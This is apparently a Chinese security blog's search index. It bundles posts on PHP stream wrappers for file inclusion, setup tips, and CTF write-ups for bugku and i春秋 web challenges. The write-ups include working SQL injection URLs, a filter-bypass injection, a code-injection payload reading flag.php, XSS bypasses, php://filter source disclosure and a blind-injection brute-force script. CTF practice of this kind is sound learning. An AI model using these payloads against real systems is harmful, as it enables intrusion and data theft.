<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[php伪协议学习]]></title>
    <url>%2F2018%2F07%2F12%2Fphpagree%2F</url>
    <content type="text"><![CDATA[php支持的协议和封装的协议: 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 CTF中主要出现的是php://,zlib,data,phar,所以文章主要研究的是这四种，其他的只是简单的学习一下。 file://、http://&amp;https、ftp://&amp;ftps://、glob://file://文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码1234&lt;?php include($_REQUEST[&apos;s&apos;]); var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=file:///绝对路径\1.php 此时回显的是hello,world，这里有个小问题，1.php中的echo执行了，但是2.php中却是空的，这是因为已经被解析了，查看源代码即可看到。 http://&amp;https允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。 HTTP 请求会附带一个 Host: 头，用于兼容基于域名的虚拟主机。 如果在你的 php.ini 文件中或字节流上下文（context）配置了 user_agent 字符串，它也会被包含在请求之中。1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码123&lt;?php var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=http://127.0.0.1/phpagree/1.php 此时回显的是hello,world，并且就是http://127.0.0.1/phpagree/1.php的内容 ftp://&amp;ftps://允许通过 FTP 读取存在的文件，以及创建新文件。 如果服务器不支持被动（passive）模式的 FTP，连接会失败。由于暂时没有搭建ftp的服务器，所以暂时无法演示。 glob://查找匹配的文件路径模式1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码12345678910&lt;?php// 循环 ext/spl/examples/ 目录里所有 *.php 文件// 并打印文件名和文件尺寸$it = new DirectoryIterator($_REQUEST[&apos;s&apos;]);foreach($it as $f) &#123; printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);&#125;?&gt; 结果如下 php://php://PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 首先要确保，在php.ini中allow_url_include设置为On,因为allow_url_include依赖于allow_url_fopen，所以allow_url_fopen也需要开启。 php://input访问请求的原始数据的只读流，可以接收到post的数据，但是当enctype=”multipart/form-data” 的时，php://input无效 1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码1234&lt;?php include($_GET[&apos;s&apos;]); var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=php://input 并且POST1.php此时回显: 可以看到1.php直接被当成了一个字符串，并没有解析。但是当POST&lt;?php echo &#39;hello,world&#39;; ?&gt;时，直接就解析了： 因为php://input相当于直接包含了&lt;?php echo &#39;hello,world&#39;; ?&gt;，并且解析，类似于include。 php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 2.php代码12345&lt;?php $output = fopen($_REQUEST[&apos;s&apos;],&apos;w&apos;); fwrite($output, &quot;hello,world&quot;); fclose($output);?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=php://output 此时回显: php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 参数:1234resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码1234&lt;?php include($_REQUEST[&apos;s&apos;]); //var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 此时的回显是: base64解码之后就是1.php的内容了 再来看一下bugku上题的payload1URL?file=php://filter//read=convert.base64-encode/resource=index.php 比如这个payload中read=convert.base64-encode，resource=index.php，过滤器还有很多种，这里给出官方文档CTF中用的最多的还是convert.base64-encode，其他的了解一下就好。还有一个小问题，为什么include的时候没有解析，因为经过base64编码后，不会被直接解析。 data://数据（RFC 2397）用法data://text/plain;base64, 2.php代码1234&lt;?php include($_REQUEST[&apos;s&apos;]); //var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=data://text/plain;base64,PD9waHANCgkkaGVsbG8gPSAnaGVsbG8sd29ybGQnOw0KCWVjaG8gJGhlbGxvOw0KPz4= 即可得到hello,world,因为PD9waHANCgkkaGVsbG8gPSAnaGVsbG8sd29ybGQnOw0KCWVjaG8gJGhlbGxvOw0KPz4=base64解码之后就是1.php的内容，include包含之后就解析成功了。 来看hackinglab一道题的payload:1URL?^.^=data://text/plain;charset=unicode,(●&apos;◡&apos;●) wp不仔细说，用法data:[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt; zlib://&amp;phar://zlib://压缩流用法zip://archive.zip#dir/file.txt phar://PHP 归档用法类似于zlib://，这两种主要是用于getshell，本地不方便做实验，所以就不用演示了。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sublime分别配置python2&3编译环境]]></title>
    <url>%2F2018%2F07%2F09%2Fsublimepy%2F</url>
    <content type="text"><![CDATA[新建sublime-build文件在上方菜单栏打开工具(T)-&gt;编译系统(U)-&gt;新编译系统，此时会出来一个文件： 将以下代码覆盖上去即可123&#123; &quot;cmd&quot;: [&quot;这里写python安装的目录/python.exe&quot;, &quot;-u&quot;, &quot;$file&quot;]&#125; 因为我配置的是python27的环境，所以保存的文件名写上python27.sublime-build，python3也类似，保存即可。此时在编译环境下可以看到python27了(sublime在编译环境中有一个预存的python，它的环境配置是默认在cmd中输入python的编译环境，我这里输入python是python3的环境，所以添加python2的环境) 编译新建一个py文件，输入12print &apos;hello&apos; 测试，ctrl+b快捷编译 编译成功，可以使用了]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>sublime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下python2&3环境变量及pip2&3冲突设置]]></title>
    <url>%2F2018%2F07%2F09%2Fpython23%2F</url>
    <content type="text"><![CDATA[1.安装Python这一步比较简单，去官网上下载安装就行了，下载链接 2.配置环境变量右键我的电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量在Path栏双击，点击新建，将Python2&amp;3的安装目录分别添加进去，这里均适用默认目录: 此时在cmd输入Python，如果有效的话，证明环境变量已经设置好了。若想输入python2&amp;3分别出现python2和python3的话，将安装目录下的python.exe更改为python2或3即可。 3.解决pip2&amp;3问题若出现unable to create process using &#39;&quot;&#39;，可能是pip版本过低输入1python36 -m pip install -U pip 即可若还是不行，将python3安装目录下的Scripts/pip.exe删除后就能正常使用]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux中如何安装Google Chrome并安装插件]]></title>
    <url>%2F2018%2F06%2F24%2Fkali-google%2F</url>
    <content type="text"><![CDATA[因为一些原因，需要在Windows下Centos的VMware虚拟机中kali的KVM虚拟机中安装Google浏览器，做个笔记 安装Google Chrome使用wget命令下载Google Chrome的debian安装包在shell中输入：1wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb 下载完之后我们准备安装,输入1dpkg -i google-chrome-stable_current_amd64.deb 但是此时会出现依赖问题： 输入以下命令后解决 1apt-get -f install 选择 y 解决完依赖问题后即可正常安装，运行 1google-chrome 会提示： 没有–no-sandbox 不支持root用户使用，虽然可以在后面加上–no-sandbox的命令，但是一般我们使用google浏览器是在GUI界面上使的。所以这里再介绍GUI界面如何解决： 首先在/usr/share/applications找到Google-Chrome然后右键图标-&gt;文件属性-&gt;桌面项-&gt;命令 在stable后面加上 1--no-sandbox --user-data-dir&amp; 注意空格,然后点击确认即可。 Kali中Google-Chrome安装插件可以直接在Kali中的Google-Chrome下载插件，但是需要挂梯子，因为我不会在kali里科学上网，所以只能导入安装包了。 首先需要得到安装包，而得到安装包的方法一般有两种： 从网上下载安装包 从Windows上的Google Chrome中导出安装包 这里建议从Windows上导出，因为网上下载的.crx文件部分不能用。 从Windows上的Google Chrome中导出安装包：首先你的电脑肯定需要挂梯子，不会的可以点此学习ssr的搭建然后登录google账户，在应用商店里下载插件。 下载完需要的插件之后点击浏览器右上方的菜单-&gt;更多工具-&gt;扩展程序。 点击打包扩展程序，会让你输入目录，我们先点击取消 点击所需要安装插件的详细信息，可以看到有个ID值： 需要从浏览器安装的插件目录中找到这个ID值,插件安装的位置一般是默认在 1C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Extensions 其中user是你电脑的用户名，找到文件夹之后，打开文件夹，里面有个版本的文件夹，继续打开直到: 此时将文件夹路径复制下来输入到刚刚填写的目录中，再点击打包扩展程序即可。 此时会出来扩展程序和秘钥文件： 我们需要的是.crx文件，将路径记下来，打开xftp连接kali进行文件传输 将文件传进去即可。 然后进入kali的GUI界面打开Google浏览器，打开扩展程序页面： 将刚刚的.crx文件拖进去即可完成安装]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku writeup合集(杂项、Web）]]></title>
    <url>%2F2018%2F06%2F06%2Fbugku%2F</url>
    <content type="text"><![CDATA[Webweb2滑稽，F12查看源，得到flag： 文件上传测试题目提示：请上传PHP文件，文件上传大小不允许超过1M试了几次之后，当上传php文件时提示非图片文件，上传图片时，提示非php文件，打开burpsuite，将一个php文件的后缀加上.jpg，上传时将.jpg删掉再上传即可 计算器题目给出的输入框限制了最大输入长度，F12将最大长度限制删掉就行. web基础$_GET这题有基础的都知道怎么做：代码：1234$what=$_GET[&apos;what&apos;];echo $what;if($what==&apos;flag&apos;)echo &apos;flag&#123;****&#125;&apos;; 将what提交了就行 web基础$_POST跟上题一样: 矛盾代码：1234567$num=$_GET[&apos;num&apos;];if(!is_numeric($num))&#123;echo $num;if($num==1)echo &apos;flag&#123;**********&#125;&apos;;&#125; 代码意思是当num不是个数字并且值等于1的时候输出flag：payload:URL?num=1x31提交拿到flag web3打开的时候阻止页面创建对话框 查看源码，在最底下有串代码 html码得到flag附上解码连接 sql注入这题是宽字节注入：原理：12345678910GBK 占用两字节ASCII占用一字节PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。大家都知道%df’ 被PHP转义，单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。 payload:1http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23 首先，在url栏输入：1http://103.238.227.13:10083/?id=%df%27 报错了,说明可以注入 继续查看可显字段和库名：1http://103.238.227.13:10083/?id=%df%27 union select 1,database()%23 告诉你查询key表里id=1的字段：1http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23 得到flag 域名解析hint：听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag直接改host就行，这里用火狐一个插件直接改访问的host就行 直接拿到flag SQL注入1过滤代码：1234567891011121314//过滤sql$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit(&apos;包含敏感关键字！&apos;.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;; 注入的关键词几乎都过滤了，但是看到后面有个xss过滤。查资料发现strip_tags（）函数会去除字符串里的html和php标签，思路是先在payload里插入html标签绕过sql的过滤，然后再用xss的过滤去除html的标签： 想通之后很简单，就是常规的sql注入,得到数据库名：1http://103.238.227.13:10087/?id=-1%20uni%3C%3Eon%20sel%3C%3Eect%201,databa%3C%3Ese()%23 payload:1http://103.238.227.13:10087/?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key %23 查找表为key的数据表，id=1值hash字段值，得到flag 你必须让他停下这题是不停的刷新页面，用burpsuite抓包就行：多go几次就能拿到flag： 本地包含括号闭合的思路，payload：1http://120.24.86.145:8003/index.php?hello= 1);print_r(file(&quot;./flag.php&quot;) 在服务器上执行的代码是(var_dump(hello=1);print_r(file(“./flag.php”));//得到flag：flag{bug-ctf-gg-99} 反括号`在linux下起着命令替换的作用。命令替换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。如下：12[root@localhost sh]# echo The date is `date` The date is 2011年 03月 14日 星期一 21:15:43 CST 单引号、双引号用于用户把带有空格的字符串赋值给变量事的分界符。如果没有单引号或双引号，shell会把空格后的字符串解释为命令。单引号和双引号的区别。单引号告诉shell忽略所有特殊字符，而双引号忽略大多数，但不包括$、\、`。例子：1234[root@localhost tmp]# echo ‘the date is `date`’ the date is `date` [root@localhost tmp]# echo “the date is `date`” the date is Fri Oct 9 00:11:56 CST 2015 eval( “var_dump($a);”);正是双引号！！！我们就可以用`了！然后用cat读取输出即可！ 变量1某春秋原题。flag In the variable !payload:1http://120.24.86.145:8004/index1.php?args=GLOBALS 参考资料 web5jsfuck右键查看源代码： 复制下来，F12放到控制台回车，得到flag： 头等舱看这个名字就感觉flag在响应头里：F12查看一下响应头，得到flag web4题目提示查看源代码， 进行了URL编码，p1解码：1function checkSubmit()&#123;var a%3ddocument.getElementById(&quot;password&quot;)%3bif(&quot;undefined&quot;!%3dtypeof a)&#123;if(&quot;67d709b2b p2解码：1aa648cf6e87a7114f1&quot;%3d%3da.value)return!0%3balert(&quot;Error&quot;)%3ba.focus()%3breturn!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit%3dcheckSubmit%3b 大概意思就是提交的值与p1里面那段值加上54aa2再加上p2里的值相同就行拼接起来提交就行： flag在index里点进去，看看URL 一个文件包含的题，直接拿php伪协议试：payload:1http://120.24.86.145:8005/post/index.php?file=php://filter//read=convert.base64-encode/resource=index.php base64解码之后得到flag：flag{edulcni_elif_lacol_si_siht} 输入密码查看flag输入5位数密码，直接爆破 得到flag 点击一百万次查看源代码: 当clicks大于1000000时，能拿到flagF12控制台输入clicks=100000000000回车即可得到flag 备份是个好习惯备份文件获取，将index.php.bak下载下来，查看源码：12345678910111213include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);$str = substr($str,1);$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.&quot;取得flag&quot;;&#125;?&gt; php弱类型比较，在url栏输入： URL?key1=QNKCDZO&amp;key2=240610708 发现没啥反应，然后看了看源码，发现过滤了key双写key绕过，提交得到flagpayload:1http://120.24.86.145:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kkeyey2=240610708 秋名山老司机直接访问： 很明显是算不到这么快的。只能写脚本了。附上python脚本：12345678910import requestsimport reurl = &apos;http://120.24.86.145:8002/qiumingshan/&apos;s = requests.Session()source = s.get(url)expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()result = eval(expression)post = &#123;&apos;value&apos;: result&#125;print(s.post(url, data = post).text) 这里有个正则匹配来匹配给出的表达式，然后直接用eval计算。最后将value post即可得到flag，但是计算出的表达式长度不一样，可能会超过php的最大长度所以需要多试几遍。 速度要快打开来什么都没有，就是一个你得快点： 查看源代码：1&lt;!-- OK ,now you have to post the margin what you find --&gt; 有一段提示，post margin变量what i find打开bp抓包： 响应头中有个flag,base64之后：1跑的还不错，给你flag吧: NjM4NzUy 估计是把 NjM4NzUy提交上去就行了,但是后面发现还得把NjM4NzUy解一次base64：638752这个后面再说原因。直接上python脚本：1234567891011import requestsimport base64import reurl=&apos;http://120.24.86.145:8002/web6/&apos;a=requests.session()r=a.get(url)FLAG=r.headers[&apos;flag&apos;]p=re.match(&apos;(.*)(: )(.*)&apos;,base64.b64decode(FLAG))payload=&#123;&apos;margin&apos;:base64.b64decode(p.group(3))&#125;r=a.post(url,data=payload)print(r.text) 得到flag: 这里可以看到我的脚本用了两次base64，如果只用一次的话，题目会提示你需要再快点，具体的这里就不试了同时给出php的脚本:12345678910111213141516171819202122232425262728&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;?php $url = &quot;http://120.24.86.145:8002/web6/&quot;; $contents = file_get_contents($url); $header_arr = get_headers($url); $cookie = $header_arr[5]; $cookie = explode(&apos;:&apos;,$cookie)[1]; $cookie = explode(&apos;;&apos;,$cookie)[0]; $flag = $header_arr[9]; $flag = explode(&apos;:&apos;,$flag)[1]; $flag = base64_decode($flag); $flag = explode(&apos;: &apos;,$flag)[1]; $flag = base64_decode($flag); $post_data = array(&quot;margin&quot;=&gt;$flag); $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_COOKIE,$cookie); curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data); $output = curl_exec($ch); curl_close($ch); print_r($output);?&gt; cookies欺骗打开题目看到一堆乱码，但是URL栏看到那个filename，估计是个base64，解码之后果然： 但是前面还有个参数line，行的意思，一开始不知道这个参数有什么用，多试了几次：1http://120.24.86.145:8002/web11/index.php?line=0&amp;filename=a2V5cy50eHQ= 当line=0，1，2等数的时候，对应着文件的0，1，2行所以这个时候我们要做的是就是把index.php这个文件读到，首先将index.phpbase64转码：aW5kZXgucGhw然后写个脚本将line从0~40遍历一次，附上php脚本：12345678910111213141516&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;?php $url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;; $url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;; for ($i=0; $i &lt; 40; $i++) &#123; $url = $url1.$i.$url2; $contents = file_get_contents($url); echo $contents; echo &quot;&lt;br&gt;&quot;; &#125; ?&gt; python脚本：123456789# coding:utf8import requests url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;;for i in range(40): url=url1+str(i)+url2 ans = requests.get(url) print(ans.text) 脚本运行之后得到的源码:123456789101112131415161718error_reporting(0); $file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); $line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &apos;0&apos; =&gt;&apos;keys.txt&apos;, &apos;1&apos; =&gt;&apos;index.php&apos;, ); if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123; $file_list[2]=&apos;keys.php&apos;; &#125; if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line]; &#125; ?&gt; 看到源码之后，当存在cookie:margin且等于margin的时候，才能读keys.php的源码,拿bp改个包，并且将文件名参数发送为keys.php转码后的值发送即可得到flag: XSS注入题目提示必须包含alert(_key_)，所以先提交:1URL?id=&lt;script&gt;alert(_key_)&lt;/script&gt; 但是没有给出flag，查看源代码： 可以看到此时s里的内容&lt; &gt;已经被转义成了&amp;lt &amp;gt,所以如果要得到flag，必须先绕过过滤：Unicode编码绕过,查看原理 用\u003c和\u003e来代替&lt; &gt; 1URL?id=\u003cscript\u003e alert(_key_)\u003c/script\u003e 替换之后没有弹窗，但是在源代码里可以看到flag: 这题做了处理，不能用简单的alert来弹窗，但是也有其他方法，payload:1URL?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e; 得到flag never give up上来发现没什么提示，看了看源代码，提示了1p.html，访问之后。。。到了bugku的论坛，估计是有个跳转，直接拿bp抓包访问即可： 做到这就有种感觉了，这题纯粹是来坑人的,将中间那段代码先复制到记事本(待会方便改)，对编码熟悉一点的人应该都知道该怎么做了，base64转码:1JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ 为什么是这一段，因为base64里是不会出现百分号的，base64解码：附上链接解码之后：1%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E ctf做多了就知道，这又是一段URL编码，这个时候比较坑的一点是，你得把这段url编码放到之前的编码里再URL解码URL编码：附上链接解码之后：1234567891011121314151617181920212223242526var Words = &quot;&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; &lt;!--&quot;;if(!$_GET[&apos;id&apos;])&#123; header(&apos;Location: hello.php?id=1&apos;); exit();&#125;$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;))&#123; echo &apos;no no no no no no no&apos;; return ;&#125;$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt;==--&gt;&quot; 直接看代码，访问f4l2a3g.txt得到flag: Misc签到题扫二维码关注bugku然后发送flag就行]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[“百度杯”CTF比赛 登陆 writeup]]></title>
    <url>%2F2018%2F05%2F31%2Flogindft%2F</url>
    <content type="text"><![CDATA[打开页面是一个登陆框: 查看源代码： 什么都发现不了，但是这个表单中用户名密码的class有点奇怪，先记着 随便输入用户名和密码同时打开burpsuite抓包： 用万能密码试试： 提示密码错误，但是当提交or &#39;1&#39; = &#39;2时，显示的是： 猜测是个布尔型的盲注 试了很多函数不行，最后看的wp，用的是正则表达式：username=or user() regexp '^a' %23```1234567891011121314151617181920212223我们用burpsuite进行盲注：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/59736271.jpg)然后字典选择`a~z,0~9,(),_`用的都是表的常用字符,然后开始爆破：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/66273786.jpg)可以知道第一位是`u`，一直持续下去可以发现这个列的名字就是前面表单用户名的`class`然后密码也是，就不仔细说了，接下来爆列:将`user()`替换成`user_n3me`：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/46135022.jpg)继续爆破：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/42315072.jpg)可以知道第一位是b，重复这个过程就行了最终得到用户名：`bctf3dm1n`密码：`2bfb1532857ddc0033fdae5bde3facdf`md5解密之后是:`adminqwe123666`一个个爆破可以比较麻烦，这里给出c26大佬的py脚本： import stringimport requests url = ‘http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;headers = {‘User-Agent’: “Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0”}payloads = string.ascii_letters + string.digitstemp = ‘’for i in range(40): print(“the”+str(i)+”one”) for p in payloads: payload = temp + p name = “admin’ or user_n3me like ‘{}%’ ;#”.format(payload) data = dict(username=name, passwrod=’test’) res = requests.post(url, headers=headers, data=data) if (len(res.content) == 12): temp = temp + p print(temp.ljust(32, ‘.’)) break`换url和列名就行。 登陆进去之后是这个页面： 那个.bctfg1t看起来像个.git文件，试了一下： 果然是个.git文件，githack跑完之后： 接下来很明显就是还原版本了，git cat-file -p 哈希一直到a1开头的哈希： 出来一个文件名,我们访问他：得到flag：]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>.git泄露</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决burpsuite里中文不显示的方法]]></title>
    <url>%2F2018%2F05%2F31%2Fbp%2F</url>
    <content type="text"><![CDATA[burpsuite中文显示不出，某些时候非常不好用 这里用的版本是1.7.26，其他的版本修改方式没有大的区别 打开burpsuite，找到user options: 然后在display中的http message display选择成中文字体，这里选择微软雅黑： 然后就成功了]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 123 writeup]]></title>
    <url>%2F2018%2F05%2F28%2F123%2F</url>
    <content type="text"><![CDATA[打开是个登陆界面： 查看一下源代码： 用户信息都在user.php里，密码的结构也告诉你了，猜想是爆破但是现在没有字典，我们先访问一下user.php，发现啥都没有，一开始以为是文件包含，但是没有变量可以用可能是备份文件获取，试试user.php.bak果然： 将文件下载下来之后发现是用户名的信息，打开burpsuite开始爆破：从1990年开始（大佬们wp写的，我也不知道为什么） 字典直接用刚刚的user.php 开始爆破： 得到了一个用户lixiuyun 密码 lixiuyun1990 登陆进去之后也是什么都没有，查看源代码： 本地构建html： php别名：php2, php3, php4, php5, phps, pht, phtm, phtml …都可以试试: 可以看到有个view.php了，打开看看这次估计真是文件包含了： 这里还有个过滤，将flag过滤了双写flag即可拿到flag：]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>爆破</tag>
        <tag>备份文件获取</tag>
        <tag>文件上传</tag>
      </tags>
